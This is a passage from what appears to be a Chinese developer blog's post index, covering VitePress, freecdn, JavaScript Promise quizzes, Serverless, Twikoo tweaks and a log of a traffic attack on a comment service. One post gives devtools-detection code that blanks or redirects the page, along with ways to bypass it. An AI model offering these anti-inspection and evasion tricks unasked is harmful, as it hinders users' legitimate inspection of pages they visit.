假如文档放在一个特定的分支下： docsBranch: 'dev', // 默认是 false, 设置为 true 来启用 editLinks: true }} VitePress 没有把 README.md 渲染成首页，需要把 README.md 重命名为 index.md。 测试编译速度多次测试在机械硬盘上两者的编译速度，VuePress 的编译时间在 30 ~ 50 秒之间，而 VitePress 的编译时间基本都在 6 ~ 7 秒，遥遥领先。 vuepress1234567891011121314151617181920$ vuepress build docswait Extracting site metadata...tip Apply local theme at D:\\Workspace\\Jimmy\\twikoo\\docs\\.vuepress\\theme...tip Apply theme local (extends @vuepress/theme-default) ...tip Apply plugin container (i.e. &quot;vuepress-plugin-container&quot;) ...tip Apply plugin @vuepress/last-updated (i.e. &quot;@vuepress/plugin-last-updated&quot;) ...tip Apply plugin @vuepress/register-components (i.e. &quot;@vuepress/plugin-register-components&quot;) ...tip Apply plugin @vuepress/active-header-links (i.e. &quot;@vuepress/plugin-active-header-links&quot;) ...tip Apply plugin @vuepress/search (i.e. &quot;@vuepress/plugin-search&quot;) ...tip Apply plugin @vuepress/nprogress (i.e. &quot;@vuepress/plugin-nprogress&quot;) ...√ Client Compiled successfully in 17.77s√ Server Compiled successfully in 14.63swait Rendering static HTML...success Generated static files in docs\\.vuepress\\dist.Done in 31.87s. vitepress1234567891011121314$ vitepress build docsvitepress v0.11.5vite v2.0.0-beta.65⠹ building client + server bundles...Langua e does not exist: shge does not exist: shLanguage does not exist: shLanguage does not exist: shLanguage does not exist: shLanguage does not exist: shLanguage does not exist: shLanguage does not exist: sh✓ building client + server bundles...✓ rendering pages...build complete in 5.39s.Done in 6.27s. 页面效果基本一致，可以看出 VitePress 存在一些渲染上的小区别。","link":"/2021/hello-vitepress/"},{"title":"静态博客接入 freecdn 提升访问速度","text":"引言上周，jsDelivr 备案许可被注销，导致本站大量静态资源加载失败，遂寻找更稳定的 CDN 替换，但是，替换 CDN 治标不治本。几天后，我在 GitHub 看到了 freecdn 这个项目，很好地解决了这个问题。 项目描述 freecdn 是一个纯前端的 CDN 解决方案，用于降低网站流量成本，同时提高网站稳定性、安全性，并且无需修改现有的业务逻辑。 互联网上有很多免费的公共库 CDN，例如 cdnjs、jsdelivr、unpkg，但哪个最稳定，始终没有明确的答案。 现在你无需纠结这个问题，随意选择即可。freecdn 可根据用户的网络状况，实时切换到合适的 CDN。 本文将会利用 freecdn 自动选择公共库的特性，加速 hexo icarus 站点。 几步接入 freecdn 修改 themes/icarus/layout/common/head.jsx 文件，在 &lt;head&gt; 后增加一行 &lt;script src=&quot;/freecdn-loader.min.js&quot;&gt;&lt;/script&gt; 博客根目录运行 hexo clean &amp;&amp; hexo g 运行 npm i -g freecdn 运行 cd public &amp;&amp; freecdn find --save &amp;&amp; freecdn js --make 运行 hexo d 或手动部署博客 如果博客访问正常，你已经成功了一半！打开控制台网络标签，可以看到资源是从 Service Worker 加载的—— 进阶freecdn 大致做了以下事情： 扫描 hexo 生成的 public 目录中所有文件的 hash 搜索公共 CDN 数据库，找到可以替换的 CDN 地址，写入清单文件 生成 freecdn-loader.min.js 用户访问站点时，加载 freecdn-loader.min.js，安装 Service Worker Service Worker 拦截网站请求，并转发到速度最快的 CDN 问题来了，由于本站的资源本来就从 CDN（jsd）加载，并不包含在 public 打包结果中，导致只有极少请求利用了 freecdn，大量请求依然走 jsd。若想解决这个问题，只好从 npm 仓库上挨个下载需要的资源，全部合并到自己的仓库管理，好在依赖的第三方资源不多，也就 8 个，半个小时足以搞定。 12345678910111213141516171819202122232425262728293031323334├─clipboard│ └─2.0.4│ └─dist├─cookieconsent│ └─3.1.1│ └─build├─highlight.js│ └─9.12.0│ ├─lib│ │ └─languages│ └─styles├─jquery│ └─3.3.1│ └─dist├─justifiedGallery│ └─3.8.1│ └─dist│ ├─css│ └─js├─lightgallery│ └─1.10.0│ ├─dist│ │ ├─css│ │ ├─fonts│ │ ├─img│ │ └─js│ ├─lib│ └─modules├─moment│ └─2.22.2│ └─min└─twikoo └─1.4.14 └─dist 如果 freecdn 能够扫描 public 中的 CDN 网址，并生成清单文件的话，就不需要这么麻烦了，然而技术实现应该很难吧。 编写脚本123456789101112131415161718192021#!/bin/bashcd ./publicUSER=imaegooREPO=imaegoo.github.ioVER=masterfiles=$(find * -type f ! -path &quot;freecdn-*&quot; ! -name &quot;.*&quot;)list=&quot;&quot;for file in $files; do hash=$(openssl dgst -sha256 -binary &quot;$file&quot; | openssl base64 -A) list=&quot;$list$hash https://www.imaegoo.com/$file$hash https://cdn.jsdelivr.net/gh/$USER/$REPO@$VER/$file&quot;donefreecdn db --import &lt;&lt;&lt; &quot;$list&quot;freecdn find --savefreecdn manifest --signfreecdn js --make","link":"/2021/hexo-free-cdn/"},{"title":"JS 反审查学习笔记","text":"前端网页如何避免被访客审查元素？总结以下方法，未来有新的想法也会记录在此篇文章里。 通过 debugger 反审查转自：https://blog.csdn.net/weixin_32496175/article/details/114013102 1234567891011121314151617181920212223242526272829303132333435((function () { var callbacks = [], timeLimit = 50, open = false; setInterval(loop, 1); return { addListener: function (fn) { callbacks.push(fn); }, cancleListenr: function (fn) { callbacks = callbacks.filter(function (v) { return v !== fn; }); } } function loop() { var startTime = new Date(); debugger; if (new Date() - startTime &gt; timeLimit) { if (!open) { callbacks.forEach(function (fn) { fn.call(null); }); } open = true; window.stop(); alert('大佬别扒了！'); document.body.innerHTML = &quot;&quot;; } else { open = false; } }})()).addListener(function () { window.location.reload();}); 弊端：访客点击继续按钮前，依旧可以审查元素，并不能有效阻止。 破解方式： 打开新标签页，打开 F12 控制台 Sources 选项卡，点亮右侧的 Activate breakpoints，再从地址栏进入目标网站即可。 判断用户是否打开了控制台转自：https://blog.csdn.net/qq_21567385/article/details/108473235 利用了控制台会读取 image element 的 id 的特性。 1234567891011(function() { var element = new Image(); Object.defineProperty(element, &quot;id&quot;, { get: function () { // 做一些打开后的操作 console.log('你打开了控制台，哈哈') location.href = &quot;https://www.imaegoo.com&quot; }, }); console.log(element);})() 破解方式： 使用油猴脚本清空控制台。 12345678910111213// ==UserScript==// @name console cleaner// @match https://*/*// @icon data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==// @grant none// ==/UserScript==(function() { 'use strict'; setInterval(function() { console.clear(); }, 500);})(); 禁用 JavaScript 权限这是非常激进的做法，基本能够应对各种反审查策略，但在 AJAX 盛行的现在，多少网页离了 JS 还可以正常展示呢？ 米游社PC 版米游社（ http://bbs.mihoyo.com/ ）的反审查做得也非常到位，有时间会研究如何破解。（学习目的！）","link":"/2021/js-anti-debugger/"},{"title":"Javascript Promise 20 题，加深理解 Promise","text":"0x001234567891011Promise.resolve(1) .then((res) =&gt; { console.log(res) return 2 }) .catch((err) =&gt; { return 3 }) .then((res) =&gt; { console.log(res) }) 答案 >folded1212 0x01 执行顺序123456789const promise = new Promise((resolve, reject) =&gt; { console.log(1) resolve() console.log(2)})promise.then(() =&gt; { console.log(3)})console.log(4) 答案 >folded12341243 0x0212345678910111213141516const promise1 = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { resolve('success') }, 1000)})const promise2 = promise1.then(() =&gt; { throw new Error('error!!!')})console.log('promise1', promise1)console.log('promise2', promise2)setTimeout(() =&gt; { console.log('promise1', promise1) console.log('promise2', promise2)}, 2000) 答案 >folded1234promise1 Promise { &lt;state&gt;: &quot;pending&quot; }promise2 Promise { &lt;state&gt;: &quot;pending&quot; }promise1 Promise { &lt;state&gt;: &quot;fulfilled&quot;, &lt;value&gt;: &quot;success&quot; }promise2 Promise { &lt;state&gt;: &quot;rejected&quot;, &lt;reason&gt;: Error: &quot;error!!!&quot; } 0x03 宏任务与微任务123456789setTimeout(() =&gt; console.log(5), 0)new Promise(resolve =&gt; { console.log(1) resolve(3) Promise.resolve().then(()=&gt; console.log(4))}).then(num =&gt; { console.log(num)})console.log(2) 答案 >folded1234512435 0x0412345678910111213const promise = new Promise((resolve, reject) =&gt; { resolve('success1') reject('error') resolve('success2')})promise .then((res) =&gt; { console.log('then: ', res) }) .catch((err) =&gt; { console.log('catch: ', err) }) 答案 >folded1then: success1 0x051234567891011121314const promise = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { console.log('once') resolve('success') }, 1000)})const start = Date.now()promise.then((res) =&gt; { console.log(res, Date.now() - start)})promise.then((res) =&gt; { console.log(res, Date.now() - start)}) 答案 >folded123oncesuccess 1000 注：理想情况为 1000，实际可能是 1000 多success 1000 注：理想情况为 1000，实际可能是 1000 多 0x0612345678910Promise.resolve() .then(() =&gt; { return new Error('error!!!') }) .then((res) =&gt; { console.log('then: ', res) }) .catch((err) =&gt; { console.log('catch: ', err) }) 答案 >folded1then: Error: error!!! 0x0712345const promise = Promise.resolve() .then(() =&gt; { return promise })promise.catch(console.error) 答案 >folded1234SpiderMonkey: TypeError: A promise cannot be resolved with itself. V8: TypeError: Chaining cycle detected for promise #&lt;Promise&gt; 0x081234Promise.resolve(1) .then(2) .then(Promise.resolve(3)) .then(console.log) 答案 >folded11 0x09123456789Promise.resolve() .then(function success (res) { throw new Error('error') }, function fail1 (e) { console.error('fail1: ', e) }) .catch(function fail2 (e) { console.error('fail2: ', e) }) 答案 >folded1fail2: Error: error 12345678910Promise.resolve() .then(function success1 (res) { throw new Error('error') }, function fail1 (e) { console.error('fail1: ', e) }) .then(function success2 (res) { }, function fail2 (e) { console.error('fail2: ', e) }) 答案 >folded1fail2: Error: error 0x0a1234567891011process.nextTick(() =&gt; { console.log('nextTick')})Promise.resolve() .then(() =&gt; { console.log('then') })setImmediate(() =&gt; { console.log('setImmediate')})console.log('end') 答案 >folded1234endnextTickthensetImmediate 0x0b12345678910111213141516171819const first = () =&gt; (new Promise((resolve, reject) =&gt; { console.log(3); let p = new Promise((resolve, reject) =&gt; { console.log(7); setTimeout(() =&gt; { console.log(5); resolve(6); }, 0) resolve(1); }); resolve(2); p.then((arg) =&gt; { console.log(arg); });}));first().then((arg) =&gt; { console.log(arg);});console.log(4); 答案 >folded123456374125 0x0c12345var p = new Promise((resolve, reject) =&gt; { reject(Error('The Fails!'))})p.catch(error =&gt; console.log(error.message))p.catch(error =&gt; console.log(error.message)) 答案 >folded12The Fails!The Fails! 0x0d12345var p = new Promise((resolve, reject) =&gt; { return Promise.reject(Error('The Fails!'))})p.catch(error =&gt; console.log(error.message))p.catch(error =&gt; console.log(error.message)) 答案 >folded1Uncaught (in promise) Error: The Fails! 0x0e12345var p = new Promise((resolve, reject) =&gt; { reject(Error('The Fails!'))}) .catch(error =&gt; console.log(error)) .then(error =&gt; console.log(error)) 答案 >folded12Error: The Fails!undefined 0x0f1234567new Promise((resolve, reject) =&gt; { resolve('Success!')}).then(() =&gt; { throw Error('Oh noes!')}).catch(error =&gt; { return &quot;actually, that worked&quot;}).catch(error =&gt; console.log(error.message)) 答案 >folded1[No output] 0x10123456789Promise.resolve('Success!') .then(data =&gt; { return data.toUpperCase() }) .then(data =&gt; { console.log(data) return data }) .then(console.log) 答案 >folded12SUCCESS!SUCCESS! 0x111234567891011Promise.resolve('Success!') .then(() =&gt; { throw Error('Oh noes!') }) .catch(error =&gt; { return 'actually, that worked' }) .then(data =&gt; { throw Error('The fails!') }) .catch(error =&gt; console.log(error.message)) 答案 >folded1The fails! 0x1212345678910111213141516171819const first = () =&gt; (new Promise((resolve, reject) =&gt; { console.log(3); let p = new Promise((resolve, reject) =&gt; { console.log(7); setTimeout(() =&gt; { console.log(5); resolve(6); }, 0); resolve(1); }); resolve(2); p.then((arg) =&gt; { console.log(arg); });}));first().then((arg) =&gt; { console.log(arg);});console.log(4); 答案 >folded123456374125 0x131234567891011121314151617181920async function async1() { console.log(1); const result = await async2(); console.log(3);}async function async2() { console.log(2);}Promise.resolve().then(() =&gt; { console.log(4);});setTimeout(() =&gt; { console.log(5);});async1();console.log(6); 答案 >folded123456126435 参考资料：https://zhuanlan.zhihu.com/p/34421918https://zhuanlan.zhihu.com/p/30797777https://zhuanlan.zhihu.com/p/98164787https://juejin.cn/post/6844903986210816013#heading-3https://juejin.cn/post/6844903605250572302","link":"/2021/js-promise-exam/"},{"title":"常用多媒体软件的开源或免费替代","text":"以下软件，除 FFmpeg 外，均支持中文。 屏幕录像开源：OBS（直播推流软件，录屏功能也非常强大）收费：Bandicam（收费录屏软件中自认为最好用的） 屏幕录像（GIF）开源：ScreenToGif 图片处理免费：XnViewMP（图片批处理功能非常好用，商用收费） 图片编辑开源：GIMP（GNU 出品）收费：Adobe Photoshop（Ps） 视频剪辑免费：Avidemux（用于简单的剪辑、合并，处理速度极快）开源：Shotcut（同事推荐）免费：DaVinci Resolve（有收费版，免费版足矣）收费：Adobe Premiere（Pr） 音频剪辑免费：Cool Edit（CE，老剪辑软件了）收费：Adobe Audition（Au） 格式转换开源：FFmpeg（命令行转码工具，有学习成本，无中文）免费：XMedia Recode（功能强大，可调节的参数非常多）收费：Xilisoft Video Converter Ultimate（功能强大，上手简单，转码快，可惜收费）","link":"/2021/media-soft/"},{"title":"浅析各家包管理工具是如何解决 npm 安装慢的痛点的","text":"贴 PPT，正文待补充。","link":"/2021/node-modules-speed-up/"},{"title":"把 Win11 的文件资源管理器改回 Win10 的 Ribbon 风格","text":"Windows 11 快速预览通道经过几个小版本更新后，修复了不少 bug，已经成为了我的主力系统。但是，作为平常使用最多的文件资源管理器，其新界面对性能的影响很大，尤其是在使用方向键切换选中的文件的时候，卡顿感严重。经过一番搜索，我找到了改回 Ribbon 风格文件资源管理器的方法，后者更稳定，性能更好。 原文链接：https://www.tomshardware.com/how-to/restore-windows-10-explorer-windows-11 ，翻译：iMaeGoo 打开注册表编辑器。你可以在 Windows 11 中通过按 Win + R 并在运行框中输入 regedit 来执行此操作，或者你可以使用搜索功能搜索 regedit。如果用户帐户控制要求许可，请单击是。 导航到 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions 如果不存在，则在左侧创建一个名为 Blocked 的注册表项，并导航到它。 在右窗格中右键单击并选择 新建 -&gt; 字符串值。出现一个新条目，名称为“新值 #”和一个数字。 将你的值重命名为 {e2bf9676-5f8f-435c-97eb-11607a5bedf7} 关闭注册表并重新启动计算机。 现在你的计算机现在应该显示经典的 Windows 10 文件资源管理器，如果你想返回 Windows 11 的文件资源管理器，只需删除刚刚创建的字符串值，再重新启动计算机。","link":"/2021/restore-windows-10-explorer-windows-11/"},{"title":"降本增效利器之 Serverless","text":"引言近年来，Serverless 成为云计算领域热门词汇。早在 2014 年，亚马逊就在 AWSre:Invent 2014 大会上推出了 AWSLambda，赢得了开发者的广泛好评。2018 年，国内云服务厂商相继开始跟进，阿里云、腾讯云也推出了自己的 Serverless 云服务。今天我们就通过国内云厂商的案例来了解，Serverless 是什么？为什么需要 Serverless？它是如何降低软件开发成本，同时增加软件开发效率的？ What - 什么是 ServerlessServerless[1]的概念简单易懂，Serverless 顾名思义即 “无服务器”。开发者只需要把源代码发布到 Serverless 平台，而无需关心如何部署与维护，也不需要关心 Serverless 如何启动、如何接受请求、有多少个执行机、如何自动扩缩容。为了实现 Serverless 这一目的，云平台通常会提供 FaaS 和 BaaS 两种服务的支持—— FaaS（Function as a Service），函数即服务。如阿里云的函数计算、AWS 的 Lambda 等。 BaaS（Backend as a Service），后端即服务，如云数据库、对象存储、消息队列等。 我们可以把 Serverless 理解为运行在 FaaS 中的，使用了 BaaS 的函数[2]。 相比于传统服务依赖于基础设施（如云服务器）搭建，Serverless 开发者不需要关心基础设施建设，而基础设施提供的集群监控、服务治理、配置管理、日志等能力，已经包含在了 Serverless 提供的服务当中。 Why - 为什么需要 Serverless现状和痛点 前后端分离是目前主流的开发模式，后端开发 RESTfulAPI 供前端调用，需要专业的后端开发人员，搭建复杂的开发环境，例如 SpringBoot、MySQL、Redis、RabbitMQ、Docker 等。后端开发完成之后，前后端需要进行联调工作。开发成本和运维成本较高。绝大多数业务场景其实并不复杂。例如，我们需要一个 HTML 转 PDF 服务，在传统的后端开发环境下，搭建环境、针对稳定性、高并发进行优化等工作，要花费数倍于业务开发的时间，费时费力。我们需要一套解决方案，降低非业务需求的开发难度，把精力投入到业务开发中。 Serverless 的特点降本增效Serverless 可以从 3 个方面节约项目成本。 节约开发成本。无需搭建开发环境。创建项目、编写代码、配置、测试、运行、部署、管理数据库，统统可以在浏览器中完成。开发者可以将开发重点关注到更有价值的业务代码，而不是浪费时间在其他事情上。 节约运维成本。日志管理、监控告警等运维工作，同样可以在浏览器中完成。 节约计算成本。用多少，收多少。传统服务器需要为闲置 CPU 和闲置内存付费，而 Serverless 只会在请求到来时计费。 支持多种编程语言以阿里云函数计算为例，几乎兼容所有的主流编程语言。 高可用 分布式。函数计算可以在不同的地域运行，无论用户在何处，都能快速响应请求。 自动扩容。以阿里云函数计算为例，高并发请求来临时，函数计算会自动启动数百个实例同时处理，业务高峰期也不会宕机。 无状态函数是无状态的，也就是说，多个运行中的函数实例不会共享内存，不会相互干扰。 Where - Serverless 适合场景说了这么多 Serverless 的好处，具体在哪些业务场景可以用 Serverless 开发呢？ 开发简单的后端接口在小规模项目中，后端只有一些简单的接口，例如 CRUD，此时熟悉 Node.js 的前端开发人员利用 Serverless 即可完成接口的开发，无需后端开发人员介入，降低了项目的成本。 以一个仓库库存管理小程序为例，开发者只需在浏览器中写几行代码，即可搞定数据库查询接口。 基于 Serverless 的 SSR（Server-Side Rendering，服务端渲染）对 SEO 要求较高的 SPA 项目，往往会选择使用服务端渲染的方式应对搜索引擎爬虫程序，爬虫程序访问间隔长，服务端渲染消耗的服务器资源少，为此专门购买服务器就显得没有必要了，编写 Serverless 应对爬虫请求，可以节省服务器资源成本。 内容管理系统（CMS）传统动态 CMS（如 WordPress）成本高、访问速度慢、资源消耗大，传统静态生成器 CMS（如 Hexo）维护门槛高，不支持动态内容。为了解决二者的缺点，Jamstack 出现了。使用网站生成器（例如 Hexo）预渲染整个网站，使用 Headless CMS（无头 CMS）管理动态内容，使用 HTTPAPI 增强网站的功能[3]。这种技术的出现很大程度上依托于各大云厂商提供的 Serverless Function 能力。我们可以在 Serverless 上部署无头 CMS（例如 Ghost），以及评论系统等插件，动态扩展网站功能，构建集快速、稳定、低成本、易于维护为一体的网站。 触发式场景Serverless 不仅支持通过 HTTP 调用，还支持定时触发、消息队列等触发方式。因此，智能家居控制、定时任务、持续集成、持续部署、消息队列的消费者等场景，都可以使用 Serverless 实现。互联网自动化（IFTTT）是“If This Then That”的缩写，是一个典型的事件驱动型工具，帮助人们利用各网站的开放 API，实现跨服务联动、硬件联动等好玩的玩法，唯一的门槛在于，你需要一台服务器来处理各种事件，Serverless 能够完美地胜任这个角色。 图像和视频处理Serverless 可以构建应用程序的图像和视频处理服务。可以使用 Serverless 服务来执行诸如动态调整图像大小或更改不同目标设备的视频转码之类的操作。 How - Serverless 开发最佳实践控制成本使用 Serverless 前，要清楚了解 Serverless 的收费模式，无论是测试，还是生产，都需要特别留意资源用量，针对业务，设置合适的监控告警和资源用量上限。Serverless 费用通常由以下几部分构成： 函数计算资源（FaaS） 调用次数 资源使用量 [单位 GBs，等于函数配置内存（GB） × 运行时长（s）] 外网出流量 数据库、对象存储资源（BaaS） 优化冷启动时间在开发过程中，我们会发现，云函数首次调用很慢。这就要从云函数的执行机制说起了。云函数存在两种启动： 冷启动：需要平台分配计算资源、加载代码、启动进程，耗时较长； 热启动：函数实例、执行进程都被复用，耗时很短。 云函数如果在一定时间内（几十分钟）没有被调用，那么平台会收回分配的计算资源，直到函数被调用前，再分配计算资源，这种情况下，会发生冷启动。 冷启动在某些场合会影响用户体验，比如，在一个评论系统中，读取评论接口的调用频率会远高于提交评论接口的调用频率，以单独的云函数实现提交评论接口，会导致提交评论接口屡次冷启动，用户提交评论缓慢。这种场景下我们可以使用“单一云函数”原则，由同一个云函数实现读取和提交，使用路由分发请求，消除不同业务逻辑间的重复冷启动时间[4]。 消除提交评论冷启动时间123456789101112131415161718192021// 云函数入口点exports.main = async (event, context) =&gt; { let res = {} try { switch (event.event) { case 'COMMENT_GET': // 读取评论 res = await commentGet(event) break case 'COMMENT_SUBMIT': // 提交评论 res = await commentSubmit(event) break default: res.code = 400 } } catch (e) { console.error('请求参数：', event) console.error('错误信息：', e) res.code = 500 } return res} 除了以上方法，我们还可以为必要的函数插入一段心跳（heart beating）逻辑，使用特定的参数触发，不进行任何操作，直接返回，然后为该函数添加定时触发器，每隔一段时间调用心跳逻辑，通过牺牲少量函数资源，阻止函数的运行资源被回收。 使用“层”分离依赖代码如果云函数拥有较多的依赖库或公共代码文件，会给在线编辑和部署带来不便。因此，为了管理这些依赖，诞生了函数层这一概念。和 Docker layer 相似，使用层管理，可以将依赖放在层中而不是部署包中，可确保部署包保持较小的体积。加快部署，方便在线编辑。 私有部署 Serverless除了公有云服务提供商提供的 Serverless 云服务外，我们还可以在私有云中部署 Serverless，这在项目不方便部署到公有云时非常有用。Nuclio 即是这样的平台，只需一行命令，即可启动 Nuclio。 一行命令启动 Nuclio1docker run -p 8070:8070 -v /var/run/docker.sock:/var/run/docker.sock -v /tmp:/tmp nuclio/dashboard:stable-amd64 Serverless 的局限Serverless 不能完全取代传统后端服务，在业务选择使用 Serverless 开发之前，我们还需要了解 Serverless 有哪些“坑”。 自动扩容也会带来高额的账单。历史上的真实案例，一个看似不起眼的递归调用，在谷歌函数计算平台引发滚雪球式自动扩容，一夜之间产生了 7.2 万美元的账单，令一家小规模国外公司面临破产[5]。 难以测试，难以调试。多数函数计算厂商仍未提供可靠的测试和调试方案。 不适合复杂度高的服务，不适合密集计算型服务。云厂商一般会为函数限制最长运行时间（一般为 10 秒 ~ 30 秒），因此函数难以处理大量的计算。 冷启动时间较长。相比长期运行的服务，函数计算接收请求时，额外经历了启动容器、拉取代码、加载运行时等阶段，函数资源被回收之后的首个请求往往需要等待 3 ~ 5 秒的冷启动时长。 绑定云厂商。不同云厂商的 API 写法不同，原生开发的函数难以迁移到其他云厂商执行。对此，我们可以选择 Serverless Framework 框架来适配不同的云厂商。 总结Serverless 架构的诞生，降低了软件开发成本，提升了软件开发效率。使用 Serverless，我们不再需要过多关注服务端的运维等不熟悉的领域，只需要专注于业务的开发、专注于产品的实现。我们需要关心的事情变少了，但我们能做的事情更多了。如果要用一句话来总结 Serverless，那就是 Less is More。 参考[1] CNCF Serverless Whitepaper v1.0 - https://github.com/cncf/wg-serverless/tree/master/whitepapers/serverless-overview[2] Serverless 掀起新的前端技术变革 - https://zhuanlan.zhihu.com/p/65914436[3] Jamstack，下一代Web建站技术栈？ - https://zhuanlan.zhihu.com/p/281085404[4] 腾讯云云开发云函数 之 代码共用 - https://www.imaegoo.com/2020/tcb-functions-dry/[5] We Burnt $72K testing Firebase + Cloud Run and almost went Bankrupt - https://blog.tomilkieway.com/72k-1/ 本文首发于 原银科技公众号 和 中原银行 InfoQ，转载请注明出处。","link":"/2021/serverless/"},{"title":"集成 Twikoo 与 lightGallery 插件，实现评论图片的点击放大","text":"Twikoo 文档页和本站的评论区，支持评论图片点击放大，你现在就可以就下拉到本文评论区试一试！ 为什么 Twikoo 没有官方支持图片点击放大？ 会增加包体大小 涉及 body DOM 节点操作，为了不影响在不同主题下的显示效果，需要杜绝这类操作 lightGallery 库是 GPLv3 协议的 我就想要实现图片点击放大功能！首先需要你拥有修改博客主题的能力。 在合适的位置（文章页，twikoo.init() 之前），引入相关的 JS 和 CSS 文件 123&lt;!-- lightGallery --&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/lightgallery@2.1.8/css/lightgallery.css&quot;&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/lightgallery@2.1.8/lightgallery.min.js&quot;&gt;&lt;/script&gt; 找到 twikoo.init 代码所在位置，进行修改 123456789101112131415161718192021222324252627twikoo.init({ // envId: 'abcdef', // ... onCommentLoaded: function () { var commentContents = document.getElementsByClassName('tk-content'); for (var i = 0; i &lt; commentContents.length; i++) { var commentItem = commentContents[i]; var imgEls = commentItem.getElementsByTagName('img'); if (imgEls.length &gt; 0) { for (var j = 0; j &lt; imgEls.length; j++) { var imgEl = imgEls[j]; var aEl = document.createElement('a'); aEl.setAttribute('class', 'tk-lg-link'); aEl.setAttribute('href', imgEl.getAttribute('src')); aEl.setAttribute('data-src', imgEl.getAttribute('src')); aEl.appendChild(imgEl.cloneNode(false)); imgEl.parentNode.insertBefore(aEl, imgEl.nextSibling); imgEl.remove(); } lightGallery(commentItem, { selector: '.tk-lg-link', share: false }); } } }}); 大功告成！","link":"/2021/twikoo-lightgallery/"},{"title":"Twikoo 多个页面共用一个评论区","text":"有时候博主希望多个页面共用一个评论区，我们可以自定义 path 做到这一点。 首先要确定自己所用的博客主题支持 Twikoo path 配置，否则需要自己修改主题源码添加 path 配置。 设置主题的 Twikoo path 配置为 window.TWIKOO_MAGIC_PATH||window.location.pathname 然后在所有需要共用评论区的页面正文中增加以下代码 &lt;script&gt;window.TWIKOO_MAGIC_PATH=&quot;评论区名称&quot;&lt;/script&gt; 把中间的“评论区名称”替换为你指定的名称，共用的页面请起 相同的 评论区名称，其他页面不做改动即可。 试试看！ 注意 如果你的网站使用了 PJAX 或类似的局部刷新技术，请在页面切换时清除 window.TWIKOO_MAGIC_PATH 的值，以免造成异常的评论区共用。","link":"/2021/twikoo-path/"},{"title":"解决 Webpack 5 Asset Modules 字体文件报 404 找不到资源问题","text":"老项目从 Webpack 4 升级到 Webpack 5，把静态资源 file-loader 换成了 Webpack 5 新增的 Asset Modules 特性： 12345678910111213 webpackChain .rule('font-rule') .test(/\\.(ttf|eot|woff|woff2)$/)- .use('file-loader')- .loader('file-loader')- .options({- name: 'fonts/[contenthash].[ext]'- })+ .type('asset/resource')+ .generator({+ filename: 'fonts/[contenthash][ext]'+ }) .end() 然而替换的过程没有那么顺利，编译打包虽然没有任何报错，但运行时字体文件报了 404。 检查打包结果发现，打包后的 CSS 包含的字体路径是错误的： dist-tree12345dist├── css│ └── index.css└── fonts └── abc.ttf index.css1234@font-face { font-family: 'abc'; src: url('fonts/abc.ttf') format('truetype');} 由于 CSS 文件中写的是字体的相对路径，浏览器会请求 css/fonts/abc.ttf，报了 404 找不到。 搜索了一下午，找到了以下相关问题： Webpack 5 asset modules issue with woff file Webpack 5 font asset issue, no error but no font either How to combine Asset modules with css-loader? Asset/resource URL in CSS problem 都没有得到解决，其中一个答案是把 asset/resource 换成 asset/inline，虽然可以解决，但如果字体过大，inline 会大幅增加 CSS 文件大小，所以不适用。 最后，在 mini-css-extract-plugin 的 issue 中找到了解决方法。 Asset links broken when extracting CSS and assets to different folders 原因是我配置的 webpack output.publicPath 是 “./“，改为 “auto“ 即可被正确识别，打包后的 CSS 会以 “../fonts/abc.ttf“ 的路径引用字体。","link":"/2021/webpack-asset-modules-in-css/"},{"title":"解决 Windows 任务栏 bug，鼠标悬停效果在鼠标离开任务栏后依旧存在","text":"鼠标移过任务栏后，明明鼠标早已经离开任务栏了，但是任务栏程序还是保持在鼠标悬停在上面的状态，一直都是这样，重启电脑或者重启资源管理器才可以解决问题，但是重启资源管理器又会导致一部分任务栏图标消失，很烦。 这个 bug 从 Windows 7 延续到 Windows 10，包括 Windows Server，依然没有解决，Windows 11 的任务栏大改，似乎解决了，但 Windows 11 的资源管理器卡顿问题更让人苦恼…… 解决方法是安装 7+ Taskbar Tweaker（官网、源码 和 下载地址），软件里的功能可以不开，设为开机自启并保持软件在后台运行即可。 这时候马上有小伙伴会问，还要安装软件？不安装不行吗？这是 Windows 的 bug，安装软件是影响最小的了。但这个软件只占用极低的磁盘空间（803 KB）和极低的内存（0.1 MB），并且可以隐藏托盘图标（点击设置，勾选隐藏任务栏图标），对于强迫症而言还是可以忍受的。","link":"/2021/windows-taskbar-hover-bug/"},{"title":"博客和 Twikoo 官方文档防御日志","text":"2022 年 4 月 4 日 ~ 4 月 6 日，Twikoo 官方文档评论区云函数流量出现异常，未触发告警，业务未中断，未处理。 日期 请求数 2 日 1,162 3 日 631 4 日 1,250,557 5 日 3,923,019 6 日 2,416,396 7 日 4,957,792 2022 年 4 月 6 日 14 时，Twikoo 官方文档评论区数据库告警，连接数超限，业务未中断，未处理。 2022 年 4 月 6 日 21 时，虹墨空间站评论区云函数告警，业务未中断，未处理。 2022 年 4 月 7 日 7:40 ~ 10:40，虹墨空间站评论区云函数持续告警，已确认最新评论接口受到攻击。 2022 年 4 月 7 日上午，虹墨空间站下线最新评论接口，Twikoo 官方文档云函数切换到维护状态。 2022 年 4 月 7 日 15:00，Twikoo v1.5.2 版本发布，新增资源防刷功能尝试抵御此次攻击。 2022 年 4 月 7 日 15:33，Twikoo 官方文档评论区切换到备用环境。 2022 年 4 月 7 日 16 时，Twikoo 官方文档评论区备用环境受到相同来源攻击。 2022 年 4 月 7 日 18:35，虹墨空间站 CDN 受到攻击，在同一分钟内触发流量告警、流量封顶触发告警阈值、流量封顶阈值触发，CDN 自动关停，攻击共产生了 3 GB 流量。 2022 年 4 月 7 日 19 时，虹墨空间站切换 CDN，恢复正常访问。 2022 年 4 月 7 日 19:53，Twikoo 官方文档评论区切换回主环境，释放备用环境。 2022 年 4 月 8 日 8 时至 4 月 9 日 8 时，Twikoo 官方文档评论区云函数共处理 2,796,722 次请求，资源防刷功能缓解了攻击，数据库和云函数使用量再无明显上升，业务正常运行。 2022 年 4 月 9 日 10 时，虹墨空间站评论区云函数和数据库同时告警，最新评论接口再次受到攻击，人在外面，未及时处理。 2022 年 4 月 9 日 11 时，虹墨空间站评论区数据库资源超出配额，停服，评论区关闭。 2022 年 4 月 9 日 13 时，针对 Twikoo 官方文档评论区云函数的攻击停止，攻击共持续 3 天。 2022 年 4 月 9 日 14 时，虹墨空间站评论区临时切换为 utterances。 本次攻击目标为虹墨空间站 